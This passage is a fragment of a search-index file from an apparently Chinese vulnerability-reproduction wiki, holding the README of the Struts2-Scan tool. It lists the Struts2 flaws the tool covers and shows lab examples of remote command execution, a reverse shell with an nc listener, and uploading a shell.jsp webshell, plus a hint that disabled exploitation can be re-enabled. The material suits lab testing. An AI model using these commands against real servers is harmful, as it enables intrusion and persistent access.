\u811a\u672c\u6587\u4ef6\u4f7f\u7528\u8bf4\u660e\uff0c\u5927\u90e8\u5206\u5199\u5728\u4e86\u811a\u672c\u91cc\uff0c\u6267\u884c\u5373\u53ef\u89c1 - EXP: \u811a\u672c\u5229\u7528\u793a\u4f8b\uff0c\u4ee5\u53ca\u6267\u884c\u6548\u679c - DES: \u90e8\u5206\u7279\u6b8a\u811a\u672c\u6587\u4ef6\u7684\u7279\u6b8a\u63cf\u8ff0","title":"Readme"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Struts2/Scan/%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%20Exphub-Strtus2/#\u53c2\u8003\u6765\u6e90","text":"ExpHub","title":"\u53c2\u8003\u6765\u6e90"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Struts2/Scan/%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%20Struts2-Scan/","text":"Struts2-Scan \u6f0f\u6d1e\u9a8c\u8bc1 \u00b6 \u5de5\u5177\u5730\u5740 \u00b6 Struts2-Scan \u5de5\u5177\u63cf\u8ff0 \u00b6 Struts2\u6f0f\u6d1e\u5229\u7528\u626b\u63cf\u5de5\u5177\uff0c\u57fa\u4e8e\u4e92\u8054\u7f51\u4e0a\u5df2\u7ecf\u516c\u5f00\u7684Structs2\u9ad8\u5371\u6f0f\u6d1eexp\u7684\u626b\u63cf\u5229\u7528\u5de5\u5177\uff0c\u76ee\u524d\u652f\u6301\u7684\u6f0f\u6d1e\u5982\u4e0b: S2-001, S2-003, S2-005, S2-007, S2-008, S2-009, S2-012, S2-013, S2-015, S2-016, S2-019, S2-029, S2-032, S2-033, S2-037, S2-045, S2-046, S2-048, S2-052, S2-053, S2-devMode, S2-057 \u652f\u6301\u5355\u4e2aURL\u6f0f\u6d1e\u68c0\u6d4b\u548c\u6279\u91cfURL\u68c0\u6d4b\uff0c\u81f3\u6b64\u6307\u5b9a\u6f0f\u6d1e\u5229\u7528\uff0c\u53ef\u83b7\u53d6WEB\u8def\u5f84\uff0c\u6267\u884c\u547d\u4ee4\uff0c\u53cd\u5f39shell\u548c\u4e0a\u4f20\u6587\u4ef6\uff0c\u6ce8\u610f\uff0c\u5e76\u4e0d\u662f\u6240\u6709\u7684\u6f0f\u6d1e\u5747\u652f\u6301\u4e0a\u8ff0\u529f\u80fd\uff0c\u53ea\u6709\u90e8\u5206\u529f\u80fd\u652f\u6301 \u8fd0\u884c\u73af\u5883 \u00b6 Python3.6.X\u53ca\u5176\u4ee5\u4e0a\u7248\u672c \u7b2c\u4e09\u65b9\u5e93: click, requests, bs4 \u6d4b\u8bd5\u73af\u5883: Ubuntu 16.04 \u6f0f\u6d1e\u73af\u5883\u5df2\u4e0a\u4f20\uff0c\u53c2\u8003\u5730\u5740\uff1a https://github.com/Medicean/VulApps/tree/master/s/struts2/ https://github.com/vulhub/vulhub/tree/master/struts2 \u5de5\u5177\u53c2\u6570 \u00b6 Usage: Struts2Scan.py [OPTIONS] Struts2\u6279\u91cf\u626b\u63cf\u5229\u7528\u5de5\u5177 Options: -i, --info \u6f0f\u6d1e\u4fe1\u606f\u4ecb\u7ecd -v, --version \u663e\u793a\u5de5\u5177\u7248\u672c -u, --url TEXT URL\u5730\u5740 -n, --name TEXT \u6307\u5b9a\u6f0f\u6d1e\u540d\u79f0, \u6f0f\u6d1e\u540d\u79f0\u8be6\u89c1info -f, --file TEXT \u6279\u91cf\u626b\u63cfURL\u6587\u4ef6, \u4e00\u884c\u4e00\u4e2aURL -d, --data TEXT POST\u53c2\u6570, \u9700\u8981\u4f7f\u7528\u7684payload\u4f7f\u7528{exp}\u586b\u5145, \u5982: name=test&passwd={exp} -c, --encode TEXT \u9875\u9762\u7f16\u7801, \u9ed8\u8ba4UTF-8\u7f16\u7801 -p, --proxy TEXT HTTP\u4ee3\u7406. \u683c\u5f0f\u4e3ahttp://ip:port -t, --timeout TEXT HTTP\u8d85\u65f6\u65f6\u95f4, \u9ed8\u8ba410s -w, --workers TEXT \u6279\u91cf\u626b\u63cf\u8fdb\u7a0b\u6570, \u9ed8\u8ba4\u4e3a10\u4e2a\u8fdb\u7a0b --header TEXT HTTP\u8bf7\u6c42\u5934, \u683c\u5f0f\u4e3a: key1=value1&key2=value2 -e, --exec \u8fdb\u5165\u547d\u4ee4\u6267\u884cshell --webpath \u83b7\u53d6WEB\u8def\u5f84 -r, --reverse TEXT \u53cd\u5f39shell\u5730\u5740, \u683c\u5f0f\u4e3aip:port --upfile TEXT \u9700\u8981\u4e0a\u4f20\u7684\u6587\u4ef6\u8def\u5f84\u548c\u540d\u79f0 --uppath TEXT \u4e0a\u4f20\u7684\u76ee\u5f55\u548c\u540d\u79f0, \u5982: /usr/local/tomcat/webapps/ROOT/shell.jsp -q, --quiet \u5173\u95ed\u6253\u5370\u4e0d\u5b58\u5728\u6f0f\u6d1e\u7684\u8f93\u51fa\uff0c\u53ea\u4fdd\u7559\u5b58\u5728\u6f0f\u6d1e\u7684\u8f93\u51fa -h, --help Show this message and exit. \u4f7f\u7528\u4f8b\u5b50 \u00b6 \u67e5\u770b\u6f0f\u6d1e\u8be6\u7ec6\u4fe1\u606f: \u00b6 $ python3 Struts2Scan.py --info ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | |_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy [+] \u652f\u6301\u5982\u4e0bStruts2\u6f0f\u6d1e: [+] S2-001:\u5f71\u54cd\u7248\u672cStruts 2.0.0-2.0.8; POST\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u9ed8\u8ba4\u53c2\u6570\u4e3a:username,password; \u652f\u6301\u83b7\u53d6WEB\u8def\u5f84,\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell [+] S2-003:\u5f71\u54cd\u7248\u672cStruts 2.0.0-2.0.11.2; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u4efb\u610f\u547d\u4ee4\u6267\u884c [+] S2-005:\u5f71\u54cd\u7248\u672cStruts 2.0.0-2.1.8.1; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u83b7\u53d6WEB\u8def\u5f84,\u4efb\u610f\u547d\u4ee4\u6267\u884c [+] S2-007:\u5f71\u54cd\u7248\u672cStruts 2.0.0-2.2.3; POST\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u9ed8\u8ba4\u53c2\u6570\u4e3a:username,password; \u652f\u6301\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell [+] S2-008:\u5f71\u54cd\u7248\u672cStruts 2.1.0-2.3.1; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell [+] S2-009:\u5f71\u54cd\u7248\u672cStruts 2.0.0-2.3.1.1; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e,URL\u540e\u9762\u9700\u8981\u8bf7\u6c42\u53c2\u6570\u540d; \u9ed8\u8ba4\u4e3a: key; \u652f\u6301\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell [+] S2-012:\u5f71\u54cd\u7248\u672cStruts Showcase App 2.0.0-2.3.13; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e,\u53c2\u6570\u76f4\u63a5\u6dfb\u52a0\u5230URL\u540e\u9762; \u9ed8\u8ba4\u4e3a:name; \u652f\u6301\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell [+] S2-013/S2-014:\u5f71\u54cd\u7248\u672cStruts 2.0.0-2.3.14.1; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u83b7\u53d6WEB\u8def\u5f84,\u4efb\u610f\u547d\u4ee4\u6267\u884c,\u53cd\u5f39shell\u548c\u6587\u4ef6\u4e0a\u4f20 [+] S2-015:\u5f71\u54cd\u7248\u672cStruts 2.0.0-2.3.14.2; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell [+] S2-016:\u5f71\u54cd\u7248\u672cStruts 2.0.0-2.3.15; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u83b7\u53d6WEB\u8def\u5f84,\u4efb\u610f\u547d\u4ee4\u6267\u884c,\u53cd\u5f39shell\u548c\u6587\u4ef6\u4e0a\u4f20 [+] S2-019:\u5f71\u54cd\u7248\u672cStruts 2.0.0-2.3.15.1; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u83b7\u53d6WEB\u8def\u5f84,\u4efb\u610f\u547d\u4ee4\u6267\u884c,\u53cd\u5f39shell\u548c\u6587\u4ef6\u4e0a\u4f20 [+] S2-029:\u5f71\u54cd\u7248\u672cStruts 2.0.0-2.3.24.1(\u9664\u4e862.3.20.3); POST\u8bf7\u6c42\u53d1\u9001\u6570\u636e,\u9700\u8981\u53c2\u6570; \u9ed8\u8ba4\u53c2\u6570:message; \u652f\u6301\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell [+] S2-032:\u5f71\u54cd\u7248\u672cStruts 2.3.20-2.3.28(\u9664\u4e862.3.20.3\u548c2.3.24.3); GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u83b7\u53d6WEB\u8def\u5f84,\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell [+] S2-033:\u5f71\u54cd\u7248\u672cStruts 2.3.20-2.3.28(\u9664\u4e862.3.20.3\u548c2.3.24.3); GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell [+] S2-037:\u5f71\u54cd\u7248\u672cStruts 2.3.20-2.3.28.1; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u83b7\u53d6WEB\u8def\u5f84,\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell [+] S2-045:\u5f71\u54cd\u7248\u672cStruts 2.3.5-2.3.31,2.5-2.5.10; POST\u8bf7\u6c42\u53d1\u9001\u6570\u636e,\u4e0d\u9700\u8981\u53c2\u6570; \u652f\u6301\u83b7\u53d6WEB\u8def\u5f84,\u4efb\u610f\u547d\u4ee4\u6267\u884c,\u53cd\u5f39shell\u548c\u6587\u4ef6\u4e0a\u4f20 [+] S2-046:\u5f71\u54cd\u7248\u672cStruts 2.3.5-2.3.31,2.5-2.5.10; POST\u8bf7\u6c42\u53d1\u9001\u6570\u636e,\u4e0d\u9700\u8981\u53c2\u6570; \u652f\u6301\u83b7\u53d6WEB\u8def\u5f84,\u4efb\u610f\u547d\u4ee4\u6267\u884c,\u53cd\u5f39shell\u548c\u6587\u4ef6\u4e0a\u4f20 [+] S2-048:\u5f71\u54cd\u7248\u672cStruts 2.3.x with Struts 1 plugin and Struts 1 action; POST\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u9ed8\u8ba4\u53c2\u6570\u4e3a:username,password; \u652f\u6301\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell [+] S2-053:\u5f71\u54cd\u7248\u672cStruts 2.0.1-2.3.33,2.5-2.5.10; POST\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u9ed8\u8ba4\u53c2\u6570\u4e3a:username,password; \u652f\u6301\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell [+] S2-devMode:\u5f71\u54cd\u7248\u672cStruts 2.1.0-2.3.1; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u83b7\u53d6WEB\u8def\u5f84,\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell \u5355\u4e2aURL\u6f0f\u6d1e\u68c0\u6d4b: \u00b6 $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | |_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy [+] \u6b63\u5728\u626b\u63cfURL:http://192.168.100.8:8080/index.action [*] ----------------results------------------ [*] http://192.168.100.8:8080/index.action \u5b58\u5728\u6f0f\u6d1e: S2-046 [*] http://192.168.100.8:8080/index.action \u5b58\u5728\u6f0f\u6d1e: S2-016 [*] http://192.168.100.8:8080/index.action \u5b58\u5728\u6f0f\u6d1e: S2-045 [*] http://192.168.100.8:8080/index.action \u5b58\u5728\u6f0f\u6d1e: S2-015 [*] http://192.168.100.8:8080/index.action \u5b58\u5728\u6f0f\u6d1e: S2-009 [*] http://192.168.100.8:8080/index.action \u5b58\u5728\u6f0f\u6d1e: S2-012 \u6279\u91cf\u6f0f\u6d1e\u68c0\u6d4b: \u00b6 $ python3 Struts2Scan.py -f urls.txt POST\u6570\u636e: \u00b6 $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -d name=admin&email=admin&age={exp} \u6307\u5b9a\u6f0f\u6d1e\u540d\u79f0\u5229\u7528: \u00b6 # \u547d\u4ee4\u6267\u884c $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --exec ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | |_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy >>>ls -la total 136 drwxr-sr-x 1 root staff 4096 May 5 2017 . drwxrwsr-x 1 root staff 4096 May 5 2017 .. -rw-r----- 1 root root 57092 Apr 13 2017 LICENSE -rw-r----- 1 root root 1723 Apr 13 2017 NOTICE -rw-r----- 1 root root 7064 Apr 13 2017 RELEASE-NOTES -rw-r----- 1 root root 15946 Apr 13 2017 RUNNING.txt drwxr-x--- 1 root root 4096 May 5 2017 bin drwx--S--- 1 root root 4096 Jul 12 14:54 conf drwxr-sr-x 3 root staff 4096 May 5 2017 include drwxr-x--- 2 root root 4096 May 5 2017 lib drwxr-x--- 1 root root 4096 Jul 12 14:54 logs drwxr-sr-x 3 root staff 4096 May 5 2017 native-jni-lib drwxr-x--- 2 root root 4096 May 5 2017 temp drwxr-x--- 1 root root 4096 Jul 12 14:54 webapps drwxr-x--- 1 root root 4096 Jul 12 14:54 work >>> # \u53cd\u5f39shll $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --reverse 192.168.100.8:8888 ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | |_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy [*] \u8bf7\u5728\u53cd\u5f39\u5730\u5740\u5904\u76d1\u542c\u7aef\u53e3\u5982: nc -lvvp 8080 # \u83b7\u53d6WEB\u8def\u5f84 $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --webpath ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | |_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy [*] /usr/local/tomcat/webapps/ROOT/ # \u4e0a\u4f20shell $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --upfile shell.jsp --uppath /usr/local/tomcat/webapps/ROOT/shell.jsp ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | |_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy [+] \u6587\u4ef6\u4e0a\u4f20\u6210\u529f! \u5173\u4e8e \u00b6 \u56e0\u90e8\u5206\u539f\u56e0\uff0c\u539f\u4f5c\u8005\u5173\u95ed\u6f0f\u6d1e\u5229\u7528\uff0c\u5982\u9700\u5229\u7528\u53ef\u5220\u9664\u4ee5\u4e0b\u4ee3\u7801\u4f7f\u7528","title":"\u626b\u63cf\u5de5\u5177 Struts2-Scan"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Struts2/Scan/%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%20Struts2-Scan/#struts2-scan-\u6f0f\u6d1e\u9a8c\u8bc1","text":"","title":"Struts2-Scan \u6f0f\u6d1e\u9a8c\u8bc1"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Struts2/Scan/%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%20Struts2-Scan/#\u5de5\u5177\u5730\u5740","text":"Struts2-Scan","title":"\u5de5\u5177\u5730\u5740"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Struts2/Scan/%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%20Struts2-Scan/#\u5de5\u5177\u63cf\u8ff0","text":"Struts2\u6f0f\u6d1e\u5229\u7528\u626b\u63cf\u5de5\u5177\uff0c\u57fa\u4e8e\u4e92\u8054\u7f51\u4e0a\u5df2\u7ecf\u516c\u5f00\u7684Structs2\u9ad8\u5371\u6f0f\u6d1eexp\u7684\u626b\u63cf\u5229\u7528\u5de5\u5177\uff0c\u76ee\u524d\u652f\u6301\u7684\u6f0f\u6d1e\u5982\u4e0b: S2-001, S2-003, S2-005, S2-007, S2-008, S2-009, S2-012, S2-013, S2-015, S2-016, S2-019, S2-029, S2-032, S2-033, S2-037, S2-045, S2-046, S2-048, S2-052, S2-053, S2-devMode, S2-057 \u652f\u6301\u5355\u4e2aURL\u6f0f\u6d1e\u68c0\u6d4b\u548c\u6279\u91cfURL\u68c0\u6d4b\uff0c\u81f3\u6b64\u6307\u5b9a\u6f0f\u6d1e\u5229\u7528\uff0c\u53ef\u83b7\u53d6WEB\u8def\u5f84\uff0c\u6267\u884c\u547d\u4ee4\uff0c\u53cd\u5f39shell\u548c\u4e0a\u4f20\u6587\u4ef6\uff0c\u6ce8\u610f\uff0c\u5e76\u4e0d\u662f\u6240\u6709\u7684\u6f0f\u6d1e\u5747\u652f\u6301\u4e0a\u8ff0\u529f\u80fd\uff0c\u53ea\u6709\u90e8\u5206\u529f\u80fd\u652f\u6301","title":"\u5de5\u5177\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Struts2/Scan/%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%20Struts2-Scan/#\u8fd0\u884c\u73af\u5883","text":"Python3.6.X\u53ca\u5176\u4ee5\u4e0a\u7248\u672c \u7b2c\u4e09\u65b9\u5e93: click, requests, bs4 \u6d4b\u8bd5\u73af\u5883: Ubuntu 16.04 \u6f0f\u6d1e\u73af\u5883\u5df2\u4e0a\u4f20\uff0c\u53c2\u8003\u5730\u5740\uff1a https://github.com/Medicean/VulApps/tree/master/s/struts2/ https://github.com/vulhub/vulhub/tree/master/struts2","title":"\u8fd0\u884c\u73af\u5883"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Struts2/Scan/%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%20Struts2-Scan/#\u5de5\u5177\u53c2\u6570","text":"Usage: Struts2Scan.py [OPTIONS] Struts2\u6279\u91cf\u626b\u63cf\u5229\u7528\u5de5\u5177 Options: -i, --info \u6f0f\u6d1e\u4fe1\u606f\u4ecb\u7ecd -v, --version \u663e\u793a\u5de5\u5177\u7248\u672c -u, --url TEXT URL\u5730\u5740 -n, --name TEXT \u6307\u5b9a\u6f0f\u6d1e\u540d\u79f0, \u6f0f\u6d1e\u540d\u79f0\u8be6\u89c1info -f, --file TEXT \u6279\u91cf\u626b\u63cfURL\u6587\u4ef6, \u4e00\u884c\u4e00\u4e2aURL -d, --data TEXT POST\u53c2\u6570, \u9700\u8981\u4f7f\u7528\u7684payload\u4f7f\u7528{exp}\u586b\u5145, \u5982: name=test&passwd={exp} -c, --encode TEXT \u9875\u9762\u7f16\u7801, \u9ed8\u8ba4UTF-8\u7f16\u7801 -p, --proxy TEXT HTTP\u4ee3\u7406. \u683c\u5f0f\u4e3ahttp://ip:port -t, --timeout TEXT HTTP\u8d85\u65f6\u65f6\u95f4, \u9ed8\u8ba410s -w, --workers TEXT \u6279\u91cf\u626b\u63cf\u8fdb\u7a0b\u6570, \u9ed8\u8ba4\u4e3a10\u4e2a\u8fdb\u7a0b --header TEXT HTTP\u8bf7\u6c42\u5934, \u683c\u5f0f\u4e3a: key1=value1&key2=value2 -e, --exec \u8fdb\u5165\u547d\u4ee4\u6267\u884cshell --webpath \u83b7\u53d6WEB\u8def\u5f84 -r, --reverse TEXT \u53cd\u5f39shell\u5730\u5740, \u683c\u5f0f\u4e3aip:port --upfile TEXT \u9700\u8981\u4e0a\u4f20\u7684\u6587\u4ef6\u8def\u5f84\u548c\u540d\u79f0 --uppath TEXT \u4e0a\u4f20\u7684\u76ee\u5f55\u548c\u540d\u79f0, \u5982: /usr/local/tomcat/webapps/ROOT/shell.jsp -q, --quiet \u5173\u95ed\u6253\u5370\u4e0d\u5b58\u5728\u6f0f\u6d1e\u7684\u8f93\u51fa\uff0c\u53ea\u4fdd\u7559\u5b58\u5728\u6f0f\u6d1e\u7684\u8f93\u51fa -h, --help Show this message and exit.","title":"\u5de5\u5177\u53c2\u6570"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Struts2/Scan/%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%20Struts2-Scan/#\u4f7f\u7528\u4f8b\u5b50","text":"","title":"\u4f7f\u7528\u4f8b\u5b50"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Struts2/Scan/%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%20Struts2-Scan/#\u67e5\u770b\u6f0f\u6d1e\u8be6\u7ec6\u4fe1\u606f","text":"$ python3 Struts2Scan.py --info ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | |_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy [+] \u652f\u6301\u5982\u4e0bStruts2\u6f0f\u6d1e: [+] S2-001:\u5f71\u54cd\u7248\u672cStruts 2.0.0-2.0.8; POST\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u9ed8\u8ba4\u53c2\u6570\u4e3a:username,password; \u652f\u6301\u83b7\u53d6WEB\u8def\u5f84,\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell [+] S2-003:\u5f71\u54cd\u7248\u672cStruts 2.0.0-2.0.11.2; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u4efb\u610f\u547d\u4ee4\u6267\u884c [+] S2-005:\u5f71\u54cd\u7248\u672cStruts 2.0.0-2.1.8.1; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u83b7\u53d6WEB\u8def\u5f84,\u4efb\u610f\u547d\u4ee4\u6267\u884c [+] S2-007:\u5f71\u54cd\u7248\u672cStruts 2.0.0-2.2.3; POST\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u9ed8\u8ba4\u53c2\u6570\u4e3a:username,password; \u652f\u6301\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell [+] S2-008:\u5f71\u54cd\u7248\u672cStruts 2.1.0-2.3.1; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell [+] S2-009:\u5f71\u54cd\u7248\u672cStruts 2.0.0-2.3.1.1; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e,URL\u540e\u9762\u9700\u8981\u8bf7\u6c42\u53c2\u6570\u540d; \u9ed8\u8ba4\u4e3a: key; \u652f\u6301\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell [+] S2-012:\u5f71\u54cd\u7248\u672cStruts Showcase App 2.0.0-2.3.13; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e,\u53c2\u6570\u76f4\u63a5\u6dfb\u52a0\u5230URL\u540e\u9762; \u9ed8\u8ba4\u4e3a:name; \u652f\u6301\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell [+] S2-013/S2-014:\u5f71\u54cd\u7248\u672cStruts 2.0.0-2.3.14.1; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u83b7\u53d6WEB\u8def\u5f84,\u4efb\u610f\u547d\u4ee4\u6267\u884c,\u53cd\u5f39shell\u548c\u6587\u4ef6\u4e0a\u4f20 [+] S2-015:\u5f71\u54cd\u7248\u672cStruts 2.0.0-2.3.14.2; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell [+] S2-016:\u5f71\u54cd\u7248\u672cStruts 2.0.0-2.3.15; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u83b7\u53d6WEB\u8def\u5f84,\u4efb\u610f\u547d\u4ee4\u6267\u884c,\u53cd\u5f39shell\u548c\u6587\u4ef6\u4e0a\u4f20 [+] S2-019:\u5f71\u54cd\u7248\u672cStruts 2.0.0-2.3.15.1; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u83b7\u53d6WEB\u8def\u5f84,\u4efb\u610f\u547d\u4ee4\u6267\u884c,\u53cd\u5f39shell\u548c\u6587\u4ef6\u4e0a\u4f20 [+] S2-029:\u5f71\u54cd\u7248\u672cStruts 2.0.0-2.3.24.1(\u9664\u4e862.3.20.3); POST\u8bf7\u6c42\u53d1\u9001\u6570\u636e,\u9700\u8981\u53c2\u6570; \u9ed8\u8ba4\u53c2\u6570:message; \u652f\u6301\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell [+] S2-032:\u5f71\u54cd\u7248\u672cStruts 2.3.20-2.3.28(\u9664\u4e862.3.20.3\u548c2.3.24.3); GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u83b7\u53d6WEB\u8def\u5f84,\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell [+] S2-033:\u5f71\u54cd\u7248\u672cStruts 2.3.20-2.3.28(\u9664\u4e862.3.20.3\u548c2.3.24.3); GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell [+] S2-037:\u5f71\u54cd\u7248\u672cStruts 2.3.20-2.3.28.1; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u83b7\u53d6WEB\u8def\u5f84,\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell [+] S2-045:\u5f71\u54cd\u7248\u672cStruts 2.3.5-2.3.31,2.5-2.5.10; POST\u8bf7\u6c42\u53d1\u9001\u6570\u636e,\u4e0d\u9700\u8981\u53c2\u6570; 